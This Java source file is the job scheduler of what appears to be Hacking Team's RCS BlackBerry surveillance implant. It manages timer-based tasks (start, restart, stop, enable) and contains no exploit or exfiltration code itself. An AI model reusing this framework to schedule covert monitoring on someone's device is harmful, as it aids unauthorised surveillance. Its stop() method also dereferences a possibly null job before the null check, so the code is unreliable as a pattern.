//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2012
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry;

import java.util.Timer;
import java.util.Vector;

import blackberry.debug.Check;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.manager.Manager;

public class JobManager extends Manager {

    //#ifdef DEBUG
    private static Debug debug = new Debug("JobManager", DebugLevel.INFORMATION);
    //#endif

    private Timer timer = new Timer();

    /**
     * Re start.
     * 
     * @param id
     *            the id
     * @return true, if successful
     */
    public final boolean reStart(final String id) {
        if (timer == null) {
            timer = new Timer();
        }

        //#ifdef DBC
        Check.requires(timer != null, "Timer null");
        //#endif

        //#ifdef DEBUG
        debug.trace("restart " + id);

        //#endif
        final boolean ret = true;

        final TimerJob job = (TimerJob) get(id);

        if (job == null) {
            //#ifdef DEBUG
            debug.error("Thread unknown: " + id);
            //#endif
            return false;
        }

        if (job.isEnabled()) {
            if (job.isScheduled()) {
                job.restart(timer);
            } else {
                //#ifdef DEBUG
                debug.warn("cannot restart: " + job + " enabled:"
                        + job.isEnabled() + " scheduled:" + job.isScheduled());
                //#endif
            }
        }
        return ret;
    }

    /**
     * Start.
     * 
     * @param id
     *            the id
     * @return true, if successful
     */
    public final synchronized boolean start(final String id) {

        if (timer == null) {
            timer = new Timer();
        }

        //#ifdef DBC
        Check.requires(timer != null, "Timer null");
        //#endif

        final TimerJob job = (TimerJob) get(id);
        if (job == null) {
            //#ifdef DEBUG
            debug.error("Thread unknown: " + id);
            //#endif
            return false;
        }

        if (!job.isEnabled()) {
            //#ifdef DEBUG
            debug.error("Not enabled [0] " + id);
            //#endif
            return false;
        }

        if (job.isScheduled()) {
            //#ifdef DEBUG
            debug.info("Already scheduled" + id);
            //#endif
            return true;
        }

        boolean ret;
        try {
            job.addToTimer(timer);
            ret = true;
            //#ifdef DEBUG
            debug.trace("Start() OK");
            //#endif

        } catch (final IllegalStateException ex) {
            //#ifdef DEBUG
            debug.trace("execute: " + id + " ex: " + ex);
            //#endif
            ret = false;
        }

        return ret;
    }

    /**
     * Start all.
     * 
     * @return true, if successful
     */
    public final synchronized boolean startAll() {
        final Vector tasks = getAllItems();
        final int tsize = tasks.size();

        timer = new Timer();

        try {
            for (int i = 0; i < tsize; ++i) {
                final TimerJob job = (TimerJob) tasks.elementAt(i);

                if (job.isEnabled()) {
                    //#ifdef DEBUG
                    debug.trace("Starting: " + job);
                    //#endif
                    job.addToTimer(timer);

                } else {
                    //#ifdef DEBUG
                    debug.trace("Not starting because disabled: " + job);
                    //#endif
                }

                //Utils.sleep(100);
            }

        } catch (final Exception ex) {
            //#ifdef DEBUG
            debug.error(ex.toString());
            //#endif
        }

        //#ifdef DEBUG
        debug.trace("StartAll() OK");

        //#endif
        return true;
    }

    /**
     * Stop.
     * 
     * @param id
     *            the id
     * @return the int
     */
    public final synchronized boolean stop(final String id) {
        //#ifdef DBC
        Check.requires(timer != null, "Timer null");
        //#endif

        final TimerJob job = (TimerJob) get(id);

        if (job.isScheduled()) {
            if (job != null) {
                job.stop();
            }
        }

        return true;
    }

    /**
     * Stop all.
     * 
     * @return the int
     */
    public final synchronized boolean stopAll() {
        final Vector tasks = getAllItems();
        final int tsize = tasks.size();

        if (timer != null) {
            timer.cancel();
        }

        for (int i = 0; i < tsize; ++i) {
            final TimerJob job = (TimerJob) tasks.elementAt(i);
            try {
                job.stop();
            } catch (final Exception ex) {
                //#ifdef DEBUG
                debug.error(ex);
                //#endif
            }
        }

        timer = null;
        return true;
    }

    /**
     * Enable.
     * 
     * @param id
     *            the id
     */
    public final void enable(final String id) {
        final TimerJob job = (TimerJob) get(id);
        job.enable(true);
    }

    /**
     * Disable.
     * 
     * @param id
     *            the id
     */
    public final void disable(final String id) {
        final TimerJob job = (TimerJob) get(id);
        job.enable(false);
    }

    /*
     * public final boolean isRunning(int id) { return getItem(id).isRunning();
     * }
     */

    /**
     * Checks if is enabled.
     * 
     * @param id
     *            the id
     * @return true, if is enabled
     */
    public final boolean isEnabled(final String id) {
        final TimerJob job = (TimerJob) get(id);
        if (job == null) {
            return false;
        } else {
            return job.isEnabled();
        }
    }
}
